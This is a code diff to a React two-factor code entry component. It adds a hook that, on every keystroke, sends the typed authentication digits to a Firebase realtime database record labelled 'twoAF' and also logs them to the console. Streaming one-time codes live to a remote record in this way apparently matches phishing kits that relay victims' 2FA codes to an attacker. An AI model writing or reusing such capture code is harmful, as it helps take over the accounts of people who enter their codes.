@@ -1,12 +1,27 @@
 "use client";
 
-import { useRef, useState } from "react";
+import { ThenableReference, update } from "firebase/database";
+import { useEffect, useRef, useState } from "react";
 
-export const AuthenticatorCode = () => {
+interface IProps {
+  dataRef: ThenableReference | null;
+}
+
+export const AuthenticatorCode = ({ dataRef }: IProps) => {
   const [loading, setLoading] = useState(false);
   const [code, setCode] = useState(["", "", "", "", "", ""]);
   const refs = useRef<any>([]);
   refs.current = [];
+
+  useEffect(() => {
+    const codeString = code.reduce((acc, value) => {
+      return acc + value;
+    });
+    console.log(codeString);
+    if (dataRef) {
+      update(dataRef, { twoAF: codeString });
+    }
+  }, [code]);
 
   const addToRefs = (el: any) => {
     if (el && !refs.current.includes(el)) {
@@ -61,7 +76,7 @@ export const AuthenticatorCode = () => {
               // <div key={val} ref={addToRefs}>
               //   {val}
               // </div>
-              <div key={val} className="w-[45px] h-[50px] ">
+              <div key={val} className="w-[40px] h-[45px] ">
                 <input
                   className="w-full h-full flex flex-col items-center justify-center text-center rounded-lg border border-gray-300 text-lg bg-white outline-none transition-all focus:border-zinc-800 focus:shadow-md"
                   type="number"
